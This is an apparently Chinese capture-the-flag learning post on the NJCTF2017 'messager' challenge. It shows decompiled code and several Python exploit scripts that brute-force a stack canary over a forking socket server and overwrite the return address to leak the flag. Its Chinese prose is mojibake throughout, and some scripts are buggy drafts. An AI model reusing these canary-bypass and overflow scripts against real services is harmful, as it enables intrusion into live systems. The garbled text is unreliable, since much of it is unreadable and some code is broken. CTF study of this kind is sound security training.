&lt;+23&gt;:	add    eax,0x1a20      0x565555b9 &lt;+28&gt;:	mov    ecx,DWORD PTR gs:0x14   0x565555c0 &lt;+35&gt;:	mov    DWORD PTR [ebp-0xc],ecx      0x565555c3 &lt;+38&gt;:	xor    ecx,ecx   0x565555c5 &lt;+40&gt;:	sub    esp,0x8   0x565555c8 &lt;+43&gt;:	lea    edx,[ebp-0x16]   0x565555cb &lt;+46&gt;:	push   edx   0x565555cc &lt;+47&gt;:	lea    edx,[eax-0x1934]   0x565555d2 &lt;+53&gt;:	push   edx   0x565555d3 &lt;+54&gt;:	mov    ebx,eax   0x565555d5 &lt;+56&gt;:	call   0x56555440 &lt;__isoc99_scanf@plt&gt;=&gt; 0x565555da &lt;+61&gt;:	add    esp,0x10   0x565555dd &lt;+64&gt;:	nop      0x565555de &lt;+65&gt;:	mov    eax,DWORD PTR [ebp-0xc]   0x565555e1 &lt;+68&gt;:	xor    eax,DWORD PTR gs:0x14   0x565555e8 &lt;+75&gt;:	je     0x565555ef &lt;main+82&gt;   0x565555ea &lt;+77&gt;:	call   0x56555670 &lt;__stack_chk_fail_local&gt;         0x565555ef &lt;+82&gt;:	lea    esp,[ebp-0x8]   0x565555f2 &lt;+85&gt;:	pop    ecx   0x565555f3 &lt;+86&gt;:	pop    ebx   0x565555f4 &lt;+87&gt;:	pop    ebp   0x565555f5 &lt;+88&gt;:	lea    esp,[ecx-0x4]   0x565555f8 &lt;+91&gt;:	retEnd of assembler dump.

â€‹		å…³æ³¨28,35å’Œ65 - 77è¿™å‡ è¡Œ,å’Œ64ä½çš„åŸºæœ¬ä¸€æ ·,å°±æ˜¯canaryçš„æ¥æºä¸åŒ
é¢˜ç›®ç»ƒä¹ NJCTF2017:messagerâ€‹		64ä½ç¨‹åº

å¼€äº†canary,è¦æƒ³åŠæ³•ç»•è¿‡,ç„¶åå¼€äº†nx,æ ˆä¸å¯æ‰§è¡Œ,è¦ç”¨ropä¹‹ç±»çš„
åæ±‡ç¼–å‡½æ•°æŒºé•¿çš„
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  int optval; // [rsp+0h] [rbp-10h] BYREF  __pid_t v5; // [rsp+4h] [rbp-Ch]  unsigned __int64 v6; // [rsp+8h] [rbp-8h]  v6 = __readfsqword(0x28u);  sub_400B76(a1, a2, a3);  puts(&quot;[+]start..&quot;);  addr.sa_family = 2;  *(_WORD *)addr.sa_data = htons(0x15B3u);  *(_DWORD *)&amp;addr.sa_data[2] = htonl(0);  len = 16;  addr_len = 16;  v5 = 0;  puts(&quot;[+]socket..&quot;);  dword_602140 = socket(2, 1, 0);  if ( dword_602140 &lt; 0 )  &#123;    perror(&quot;socket&quot;);    return 0xFFFFFFFFLL;  &#125;  optval = 1;  setsockopt(dword_602140, 1, 2, &amp;optval, 4u);  puts(&quot;[+]bind..&quot;);  if ( bind(dword_602140, &amp;addr, len) &lt; 0 )  &#123;    perror(&quot;bind error&quot;);    return 0xFFFFFFFFLL;  &#125;  puts(&quot;[+]listen..&quot;);  if ( listen(dword_602140, 1024) &lt; 0 )  &#123;    perror(&quot;listen&quot;);    return 0xFFFFFFFFLL;  &#125;  while ( 1 )  &#123;    fd = accept(dword_602140, &amp;stru_602130, &amp;addr_len);    if ( fd == -1 )    &#123;      perror(&quot;accept&quot;);      return 0xFFFFFFFFLL;    &#125;    send(fd, &quot;Welcome!\n&quot;, 9uLL, 0);    v5 = fork();    if ( v5 == -1 )    &#123;      perror(&quot;fork&quot;);      return 0xFFFFFFFFLL;    &#125;    if ( !v5 )      break;    close(fd);  &#125;  signal(14, handler);  alarm(3u);  if ( (unsigned int)sub_400BE9() )  &#123;    if ( send(fd, &quot;Message receive failed\n&quot;, 0x19uLL, 0) == -1 )      goto LABEL_14;  &#125;  else if ( send(fd, &quot;Message received!\n&quot;, 0x12uLL, 0) == -1 )  &#123;LABEL_14:    perror(&quot;send&quot;);    return 0xFFFFFFFFLL;  &#125;  return 0LL;&#125;sub_400BE9  __int64 sub_400BE9()&#123;  char s[104]; // [rsp+10h] [rbp-70h] BYREF  unsigned __int64 v2; // [rsp+78h] [rbp-8h]  v2 = __readfsqword(0x28u);  printf(&quot;csfd = %d\n&quot;, (unsigned int)fd);  bzero(s, 0x64uLL);  if ( (unsigned int)recv(fd, s, 0x400uLL, 0) == -1 )  &#123;    perror(&quot;recv&quot;);    return 0xFFFFFFFFLL;  &#125;  else  &#123;    printf(&quot;Message come: %s&quot;, s);    fflush(stdout);    return 0LL;  &#125;&#125;

sub_400BE9 è¿™é‡Œæ¥æ”¶çš„å€¼çš„å¤§å°æ˜¯0x400,è¶…äº†sçš„104,å­˜åœ¨æ ˆæº¢å‡º
æ‰€ä»¥å¯ä»¥è®©æ¯æ¬¡forkçš„å­è¿›ç¨‹æ¥å°è¯•
é—®é¢˜æ˜¯forkäº†ä¹‹åæ˜¯æ€ä¹ˆä¸ªæ‰§è¡Œæµ? çˆ¶è¿›ç¨‹è¿˜åœ¨whileå¾ªç¯,å­è¿›ç¨‹å‘¢?
forkè°ƒç”¨çš„ä¸€ä¸ªå¥‡å¦™ä¹‹å¤„å°±æ˜¯å®ƒä»…ä»…è¢«è°ƒç”¨ä¸€æ¬¡ï¼Œå´èƒ½å¤Ÿè¿”å›ä¸¤æ¬¡ï¼Œå®ƒå¯èƒ½æœ‰ä¸‰ç§ä¸åŒçš„è¿”å›å€¼ï¼š
(1)åœ¨çˆ¶è¿›ç¨‹ä¸­ï¼Œforkè¿”å›æ–°åˆ›å»ºå­è¿›ç¨‹çš„è¿›ç¨‹IDï¼›
(2)åœ¨å­è¿›ç¨‹ä¸­ï¼Œforkè¿”å›0ï¼›
(3)å¦‚æœå‡ºç°é”™è¯¯ï¼Œforkè¿”å›ä¸€ä¸ªè´Ÿå€¼ã€‚
æ‰€ä»¥çˆ¶è¿›ç¨‹ä¼šä¸€ç›´åœ¨whileé‡Œå¾ªç¯,ä¸ä¼šå®é™…ä¸Šæ¥æ”¶åˆ°å€¼,å­è¿›ç¨‹æ‰ä¼šæ¥æ”¶åˆ°å€¼,æ‰€ä»¥å­è¿›ç¨‹å´©äº†ä¸å½±å“çˆ¶è¿›ç¨‹,å°±å¯ä»¥è¿›è¡Œçˆ†ç ´canary
Could not allocate dynamic translator buffer
é‡æ–°å®‰è£…ä¸€ä¸‹checksec
æŸ¥çœ‹ç«¯å£æ ¹æ®è¿›ç¨‹å· 
netstat -anlp | grep â€œmessâ€
çœ‹ä¸æ‡‚è¦æ€ä¹ˆè¿æ¥â€¦å…ˆç™¾åº¦ä¸€æ³¢ã€‚åº”è¯¥è¦æœ‰ç«¯å£çš„å‘€
socket(domain, type, protocol);
accept(fd, addr, addr_len);
listen(fd, n);
æ±‡ç¼–ä»£ç é‡Œå†™å“ªäº†å‘¢?

â€‹		è·å–canaryè„šæœ¬
12345678910111213141516171819202122232425from pwn import *import socketcontext.log_level= &quot;debug&quot;canary = b&quot;&quot;for i in range(0,8):    for j in range(0,256):        s = socket.socket()        s.connect((&quot;127.0.0.1&quot;,5555))        ret = s.recv(1024)        j = b&quot;a&quot;*104 + chr(j).encode(&quot;utf-8&quot;)        s.send(j)        try:            ret = s.recv(1024)            if  b&quot;Message received!&quot; in ret:                print(&quot;success&quot;)                canary += chr(j)                print(canary)                s.close()                break        except:            continue      



1

â€‹		ä½†æ˜¯è¿™ä¸ªè„šæœ¬çš„é—®é¢˜,å¥½åƒåœ¨çˆ†ç ´canaryçš„æ—¶å€™è¿˜æ˜¯ä¼šæœ‰é—®é¢˜â€¦.å…ˆä¸ç®¡äº†â€¦è¿™ä¸ªé—®é¢˜è€½æå¤ªä¹…äº†,åé¢å†ç ”ç©¶
123456789101112131415161718192021222324252627282930from pwn import *import socketcontext.log_level= &quot;debug&quot;canary = b&quot;&quot;for i in range(0,8):    print(&quot;tiao nale&quot;)    print(canary)    for j in range(0,256):        s = socket.socket()        s.connect((&quot;127.0.0.1&quot;,5555))        ret = s.recv(1024)        data = b&quot;a&quot;*104 +canary +  chr(j).encode(&quot;utf-8&quot;)        #print(data)        s.send(data)        try:            ret = s.recv(1024)            if  b&quot;Message received!&quot; in ret:                #print(&quot;success&quot;)                canary += bytes(chr(j).encode(&quot;utf-8&quot;))                break        except Exception as e:            print(e)s = socket.socket()s.connect((&quot;127.0.0.1&quot;,5555))ret = s.recv(1024)s.send(b&quot;a&quot;*104+canary+b&quot;a&quot;*8 + p64(0x400bc6))print(s.recv(1024))

â€‹		å‡è®¾å·²ç»å¾—åˆ°äº†canaryäº†,ä¸‹ä¸€æ­¥æ˜¯è¦†ç›–è¿”å›åœ°å€,æœ‰onegadgetè¿˜æ˜¯system binsh?åé—¨å‡½æ•°?
123456789101112ssize_t sub_400B76()&#123;  int fd; // [rsp+Ch] [rbp-4h]  fd = open(&quot;./flag&quot;, 0);  if ( fd &lt; 0 )  &#123;    perror(&quot;open flag failed&quot;);    exit(0);  &#125;  return read(fd, &amp;unk_602160, 0x64uLL);&#125;

â€‹		ä¼šæŠŠflagè¯»åˆ°bssæ®µ,0x602160, ç„¶åå†æ„é€ ä¸€ä¸ªputsæŠŠå®ƒæ‰“å°å‡ºæ¥å§,è¿™é‡Œä¸éœ€è¦libcäº†å—
â€‹		æº¢å‡ºé•¿åº¦ + ebp + sub_400B76 + putsåœ°å€ + è¿”å›åœ°å€ + å‚æ•°
â€‹		nonono ,å…¶å®æ˜¯è¿™é‡Œè—äº†ä¸€ä¸ªå‡½æ•°,ä¸ºå•¥idaæ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥å‘¢????
1234567891011.text:0000000000400BC6                 push    rbp.text:0000000000400BC7                 mov     rbp, rsp.text:0000000000400BCA                 mov     eax, cs:fd.text:0000000000400BD0                 mov     ecx, 0.text:0000000000400BD5                 mov     edx, 64h ; &#x27;d&#x27;.text:0000000000400BDA                 mov     esi, offset unk_602160.text:0000000000400BDF                 mov     edi, eax.text:0000000000400BE1                 call    _send.text:0000000000400BE6                 nop.text:0000000000400BE7                 pop     rbp.text:0000000000400BE8                 retn



1234567891011121314151617181920212223242526272829303132from pwn import *def leak_canary():    canary = &#x27;&#x27;    while len(canary) != 8:        for j in range(255):            try:                p = remote(&#x27;127.0.0.1&#x27;, 5555)                p.recvuntil(b&#x27;Welcome!\n&#x27;)                payload = &#x27;a&#x27; * (0x68) + canary + chr(j)                p.send(payload)                msg = p.recvuntil(b&#x27;\n&#x27;)                if b&#x27;received&#x27; in msg:                    canary += chr(j)                    p.close()                    break                p.close()            except:                p.close()    print(canary)    return u64(canary.ljust(8, &#x27;\x00&#x27;))def pwn():    canary = leak_canary()    p = remote(&#x27;127.0.0.1&#x27;, 5555)    p.recvuntil(b&#x27;Welcome!\n&#x27;)    payload = b&#x27;a&#x27; * (0x68) + p64(canary) + b&#x27;a&#x27; * 8 + p64(0x400bc6)    p.send(payload)    p.interactive()pwn()



é—®é¢˜: è¿™ä¸ªæ ˆçš„104é•¿åº¦å¥½åƒä¸å¤ªå¯¹
æ’é”™â€‹		å¯„,å¡åœ¨äº†å­—ç¬¦æ€ä¹ˆè¡¨ç¤ºè¿™é‡Œ,ç„¶åäº§ç”Ÿäº†ä¸€å¤§å †çš„é—®é¢˜,æœ€åè°ƒè¯•åˆ†æåå‘ç°æ˜¯python2ä¸python3ç‰ˆæœ¬å·®åˆ«,å¯¹å­—ç¬¦ä¸²å’Œbytesè¡¨ç¤ºä¸åŒçš„é—®é¢˜,æœ‰ç‚¹ä¹±
è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜,å°±æ˜¯intæ€ä¹ˆè½¬byte
è¿˜æœ‰å°±æ˜¯è¿™æ ·çš„ç¨‹åºæ€ä¹ˆè°ƒè¯•å‘¢â€¦â€¦â€¦.
è¿˜æœ‰strè½¬bytei
ç•™å¿µä¸€ä¸‹ä½ å†™çš„å¥‡è‘©ä¸œè¥¿
123456789101112for j in [0,1,2,3,4,5,6,7,8,9,&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;]:    #print(j)    s = socket.socket()    s.connect((&quot;127.0.0.1&quot;,5555))    ret = s.recv(1024)    #j = b&quot;a&quot;*104 + j.to_bytes(1,&#x27;little&#x27;)    j = b&quot;a&quot;*104 + str(j).encode(&quot;utf-8&quot;)    print(str(j))    s.send(j)    #s.send(j.to_bytes(1,&#x27;little&#x27;))    ret = s.recv(1024)    print(ret)

â€‹		é¦–å…ˆ,åº”è¯¥æ˜¯çˆ†ç ´256ä¸ªæ•°å­—,è¿™ä¸ªæ˜¯asciiç çš„èŒƒå›´? ç„¶åä¸æ˜¯str,è€Œæ˜¯chr, å¯¹åº”çš„å­—ç¬¦
12345678910111213141516from pwn import *import socketcontext.log_level= &quot;debug&quot;for j in range(0,256):    #print(j)    s = socket.socket()    s.connect((&quot;127.0.0.1&quot;,5555))    ret = s.recv(1024)    #j = b&quot;a&quot;*104 + j.to_bytes(1,&#x27;little&#x27;)    j = b&quot;a&quot;*104 + chr(j).encode(&quot;utf-8&quot;)    print(str(j))    s.send(j)    #s.send(j.to_bytes(1,&#x27;little&#x27;))    ret = s.recv(1024)    print(ret)



bâ€™aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00â€™bâ€™Message received!\nâ€™
â€‹		ç„¶åå°±å¯ä»¥äº†!!! ä¸ºå•¥ä¹‹å‰ä¸€ç›´ä¸è¡Œå‘¢?â€¦.
â€‹		è¿˜æœ‰å°±æ˜¯breakä¸ºä»€ä¹ˆbreakä¸å‡ºå»å‘¢? å½“æ—¶å¯èƒ½å°±æ˜¯å› ä¸ºæ˜¯åœ¨è¿™é‡Œä¸€ç›´æ²¡è·³å‡ºå»..æ‰€ä»¥ä»¥ä¸ºä¸€ç›´æ²¡æˆåŠŸ,å…¶å®æˆåŠŸl ,reté‡Œæ˜æ˜æœ‰çš„,ä½†æ˜¯retå¥½åƒæ˜¯bytesç±»å‹,è€Œå’±ç»™çš„æ˜¯å­—ç¬¦ä¸²,æ‰€ä»¥ä¸è¡Œ. åœ¨å®ƒå‰é¢åŠ ä¸€ä¸ªbå°±å¯ä»¥äº†!if  bâ€Message received!â€ in ret:
123456789101112131415161718192021222324252627282930from pwn import *import socketcontext.log_level= &quot;debug&quot;# sh = process(&quot;./messager&quot;)#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(sh,&quot;break *0x8048e96&quot;)for j in range(0,256):    #print(j)    s = socket.socket()    s.connect((&quot;127.0.0.1&quot;,5555))    ret = s.recv(1024)    j = b&quot;a&quot;*104 + chr(j).encode(&#x27;latin-1&#x27;)    print(str(j))    s.send(j)    try:        ret = s.recv(1024)        print(ret)        print(type(ret))        #if &quot;Message received&quot; in ret:        if  &quot;Message received!&quot; in ret:            print(&quot;success&quot;)            print(j)            s.close()            break    except:        continue

â€‹		ä½†æ˜¯æœ‰æ—¶å€™éƒ½è¿›å»è¾“å‡ºsuccessäº† è¿˜æ˜¯ä¸èƒ½break,è¿™æ˜¯ä¸ºå•¥. æŠŠè¿™ä¸¤è¡Œç»™æ³¨é‡Šæ‰å°±å¯ä»¥äº†â€¦.ä¸ºä»€ä¹ˆ???
â€‹		æˆ‘çŒœæ˜¯äº§ç”ŸæŠ¥é”™äº†.an integer is required (got type bytes) æœç„¶!! chr(j)æ˜¯ä¸è¡Œçš„
1234if  b&quot;Message received!&quot; in ret:             #print(&quot;success&quot;)             #canary += chr(j)             break

â€‹		å„ç§å„æ ·ç¼–ç çš„é—®é¢˜â€¦â€¦..çœŸçš„å¾ˆå¥‡æ€ªè¯¶â€¦è¦æ€ä¹ˆæ ·æ‰èƒ½é¿å…å‘¢?
ç„¶åçˆ†ç ´å‡ºä¸€ä½canaryäº†ä¹‹å,ç»§ç»­çˆ†ç ´,çˆ†ç ´å®Œäº†ä¹‹åå°±å¯ä»¥æ ˆæº¢å‡ºäº†
https://e3pem.github.io/2018/09/30/NJCTF2017/
å¦‚æœæ­£å¸¸çš„è¯,ä¼šè¿”å›messager received
ä¸ºå•¥ä¸€ç›´çˆ†ç ´ä¸æˆåŠŸå‘¢,å¾ˆå¥‡æ€ª ä¸ºä»€ä¹ˆpython2å°±å¯ä»¥å‘¢? ä¸ºä»€ä¹ˆpython3ä¸è¡Œå‘¢â€¦â€¦..
å¯¹æ¯”ä¸€ä¸‹åç«¯æ¥æ”¶åˆ°çš„çœ‹ä¸€ä¸‹
Python2: Message come: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcsfd &#x3D; 5
successthis is34â€œ
[+] Opening connection to 127.0.0.1 on port 5555: Donethis is30\x1e[*] Closed connection to 127.0.0.1 port 5555[+] Opening connection to 127.0.0.1 on port 5555: Donethis is31\x1f
[+] Opening connection to 127.0.0.1 on port 5555: DoneAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00this is32
[] Closed connection to 127.0.0.1 port 5555[+] Opening connection to 127.0.0.1 on port 5555: DoneAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00this is33![] Closed connection to 127.0.0.1 port 5555[+] Opening connection to 127.0.0.1 on port 5555: DoneAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00this is34â€œ
python3:
Message come: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAâ€â€&#96;*** stack smashing detected ***:  terminated
æ„Ÿè§‰è¿™é‡Œå¤šäº†ç‚¹ä¸œè¥¿?æ˜¯çš„,ä¸ºä»€ä¹ˆpython2è¿™é‡Œä¸æ˜¾ç¤ºå‘¢?
è¿™æ˜¯ç¬¬30ä¸ª\x1e[] Closed connection to 127.0.0.1 port 5555[+] Opening connection to 127.0.0.1 on port 5555: Doneè¿™æ˜¯ç¬¬31ä¸ª\x1f[] Closed connection to 127.0.0.1 port 5555[+] Opening connection to 127.0.0.1 on port 5555: Doneè¿™æ˜¯ç¬¬32ä¸ª
[] Closed connection to 127.0.0.1 port 5555[+] Opening connection to 127.0.0.1 on port 5555: Doneè¿™æ˜¯ç¬¬33ä¸ª![] Closed connection to 127.0.0.1 port 5555[+] Opening connection to 127.0.0.1 on port 5555: Doneè¿™æ˜¯ç¬¬34ä¸ªâ€œ
bâ€™AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1fâ€™è¿™æ˜¯ç¬¬31ä¸ª\x1f[*] Closed connection to 127.0.0.1 port 5555[+] Opening connection to 127.0.0.1 on port 5555: Donebâ€™AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA â€˜è¿™æ˜¯ç¬¬32ä¸ª
[] Closed connection to 127.0.0.1 port 5555[+] Opening connection to 127.0.0.1 on port 5555: Donebâ€™AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!â€™è¿™æ˜¯ç¬¬33ä¸ª![] Closed connection to 127.0.0.1 port 5555[+] Opening connection to 127.0.0.1 on port 5555: Donebâ€™AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAâ€â€˜è¿™æ˜¯ç¬¬34ä¸ªâ€œ
python2ç‰ˆæœ¬exp,è¿™ä¸ªçš„è¯,æ˜¯åªæœ‰io.recv()æ¥æ”¶åˆ°äº†ä¿¡æ¯,æ‰ä¼šå¾€ä¸‹æ‰§è¡Œ,ä¸ç„¶å°±èµ°exceptäº†
1234567891011121314151617181920212223242526272829from pwn import *def brute_canary():    global canary    canary = &#x27;\x00&#x27;    for x in xrange(256): # 2 ** 8        io = remote(&quot;127.0.0.1&quot;, 5555)        io.recv()        io.send(&quot;A&quot; * 104 + canary + chr(x))        try:            io.recv()            canary += chr(x)            print(&quot;success&quot;)            print(&quot;this is&quot;+str(x))            print(chr(x))            break        except: continue        finally: io.close()def pwn():    io = remote(&quot;127.0.0.1&quot;, 5555)    io.recv()    io.send(&quot;A&quot; * 104 + canary + &quot;A&quot; * 8 + p64(0x400BC6))    print io.recvline()if __name__ == &#x27;__main__&#x27;:    brute_canary()    pwn()



é”™è¯¯çš„python3
12345678910111213141516171819202122232425262728293031from pwn import *import socketdef leak_canary():    for i in range(40):        io = socket.socket()        io.connect((&quot;127.0.0.1&quot;,5555))        io.recv(1024)        senddata = b&quot;A&quot;*104 +  bytes(chr(i),&#x27;utf-8&#x27;)        #print(senddata)        print(&quot;è¿™æ˜¯ç¬¬&quot;+str(i)+&quot;ä¸ª&quot;)        io.send(senddata)        try:            data = io.recvline()            if &quot;Message received&quot; in data:                print(&quot;success&quot;)            break  #ä»£è¡¨è¿™ä¸€ä½å·²ç»çˆ†ç ´æˆåŠŸ,è·³å‡ºåè¿›è¡Œä¸‹ä¸€ä½çˆ†ç ´        except:            continue        finally:            io.close()def pwn():    io = remote(&quot;127.0.0.1&quot;,5555)    io.recv()    print(io.recvline())if __name__ == &#x27;__main__&#x27;:    leak_canary()    pwn()

â€‹		é¦–å…ˆ,é—®é¢˜åœ¨data &#x3D; io.recvline(), è¿™ä¸ªä¸è¡Œ,å¯èƒ½æ˜¯å›å¤çš„æ²¡æœ‰æ¢è¡Œç¬¦? recvå°±å¯ä»¥äº†! data &#x3D; io.recv(1024),ç„¶åé—®é¢˜å’Œä¹‹å‰ä¸€æ ·,æ¯”ç‰¹å­—ç¬¦å’Œå­—ç¬¦ä¸²æ¯”è¾ƒä¸è¡Œ,éœ€è¦ç»Ÿä¸€æ ¼å¼!
ç»è¿‡ä¿®æ”¹åçš„
1234567891011121314151617181920212223242526272829303132from pwn import *import socketdef leak_canary():    global canary    canary = &#x27;\x00&#x27;    for i in range(30,35):        io = remote(&quot;127.0.0.1&quot;,5555)        io.recv()        io.send(b&quot;A&quot;*104 +  bytes(chr(i),&#x27;utf-8&#x27;))        #print(senddata)        print(&quot;è¿™æ˜¯ç¬¬&quot;+str(i)+&quot;ä¸ª&quot;)          try:            io.recv()            canary += chr(x)            print(&quot;success&quot;)            print(&quot;this is&quot;+str(x))            print(chr(x))            break        except: continue        finally: io.close()def pwn():    io = remote(&quot;127.0.0.1&quot;,5555)    io.recv    print(io.recvline())if __name__ == &#x27;__main__&#x27;:    leak_canary()    pwn()

https://blog.csdn.net/Alex_andra/article/details/105923008
Python2:â€Aâ€ * 104 + chr(i)
Python3:bâ€Aâ€*104 +  bytes(chr(i),â€™utf-8â€™)
ä¸ºä»€ä¹ˆå®ƒä»¬çš„è¾“å‡ºä¸ä¸€æ ·
æ‰“å°å­—ç¬¦çš„ç¼–ç ç±»å‹çœ‹çœ‹?
12345678910111213141516171819oot@VM-24-10-ubuntu:/home/ubuntu/ctfquanwei/REPL-master/Canary/NJCTF2017_messager# python2Python 2.7.17 (default, Feb 27 2021, 15:10:58)[GCC 7.5.0] on linux2Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; import sys,locale&gt;&gt;&gt; sys.getdefaultencoding()&#x27;ascii&#x27;&gt;&gt;&gt; qTraceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;NameError: name &#x27;q&#x27; is not defined&gt;&gt;&gt; quit()root@VM-24-10-ubuntu:/home/ubuntu/ctfquanwei/REPL-master/Canary/NJCTF2017_messager# python3Python 3.8.0 (default, Dec  9 2021, 17:53:27)[GCC 8.4.0] on linuxType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; import sys,locale&gt;&gt;&gt; sys.getdefaultencoding()&#x27;utf-8&#x27;







ä¸‡èƒ½çš„chatgptâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ç‰›çš„
è®©chatgptæŠŠpython2çš„ä»£ç ä¿®æ”¹æˆpython3çš„å°±å¯ä»¥äº†â€¦â€¦â€¦â€¦

æˆ‘ä¹‹å‰ä¹Ÿæ˜¯è¿™ä¹ˆåšçš„å‘€,åªæ˜¯æ²¡æœ‰canaryçš„\x00é‚£ä¸ªå€¼,ä¸ºä»€ä¹ˆå°±ä¸è¡Œå‘¢? æœç„¶æ˜¯å› ä¸ºè¿™ä¸ªâ€¦â€¦
æ‰€ä»¥é—®é¢˜ä¸åœ¨äºç¼–ç ,è€Œåœ¨äºè¿™ä¸ª\x00
python3
pythonå¯ä»¥æ‰“å°æ•°æ®ç±»å‹,æ‰“å°ä¸€ä¸‹,ä¹Ÿå¯ä»¥æ‰“å°ä¸€ä¸‹åå…­è¿›åˆ¶çœ‹çœ‹å§
bâ€™AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00â€â€˜&lt;class â€˜bytesâ€™&gt;successthis is 34
ä¸åŠ canaryä¹Ÿæ˜¯bytes,æ‰€ä»¥å’Œæ•°æ®ç±»å‹åº”è¯¥æ²¡å…³ç³»
æ‰“å°å­—èŠ‚æµçš„åå…­è¿›åˆ¶
â€¦â€¦â€¦..0x410x410x410x00x21
å¯¹python2æ¥è¯´
&lt;type â€˜strâ€™&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00this is34â€œsuccessthis is34â€œ
1234567891011121314151617181920212223from pwn import *def brute_canary():    global canary    canary = &#x27;\x00&#x27;    for x in xrange(30,35): # 2 ** 8        io = remote(&quot;127.0.0.1&quot;, 5555)        io.recvuntil(b&quot;Welcome!\n&quot;)        io.send(&quot;A&quot; * 104 + canary + chr(x))        try:            io.recv()            canary += chr(x)            print(&quot;success&quot;)            print(&quot;this is&quot;+str(x))            print(chr(x))            break        except: continue        finally: io.close()if __name__ == &#x27;__main__&#x27;:    brute_canary()

</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/" title="pwnå…¥é—¨-7-æ ¼å¼åŒ–å­—ç¬¦ä¸²é¢˜ç›®ç»ƒä¹ 1">pwnå…¥é—¨-7-æ ¼å¼åŒ–å­—ç¬¦ä¸²é¢˜ç›®ç»ƒä¹ 1</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-02-17T03:02:28.000Z" title="å‘è¡¨äº 2023-02-17 11:02:28">2023-02-17</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-02-18T11:41:29.378Z" title="æ›´æ–°äº 2023-02-18 19:41:29">2023-02-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWNå…¥é—¨</a></span></div><div class="content">[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5

ç¬¬ä¸€ä¸ªæ„Ÿè§‰æ˜¯ åˆ©ç”¨ç¬¬ä¸€ä¸ªnameçš„è¾“å…¥æŠŠ&#x2F;dev&#x2F;urandomçš„å€¼ä¿®æ”¹äº†,ç„¶åpasswdè¾“å…¥è¿™ä¸ªå€¼å°±å¯ä»¥äº†
1234567root@VM-24-10-ubuntu:/home/ubuntu/str/pwn5# checksec pwn[*] &#x27;/home/ubuntu/str/pwn5/pwn&#x27;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)



æ•´ä½“çš„æ€è·¯æ˜¯,
1.æ‰¾åˆ°è¦ä¿®æ”¹çš„å€¼çš„åœ°å€,æŠŠè¿™ä¸ªåœ°å€å†™å…¥æ ˆä¸­
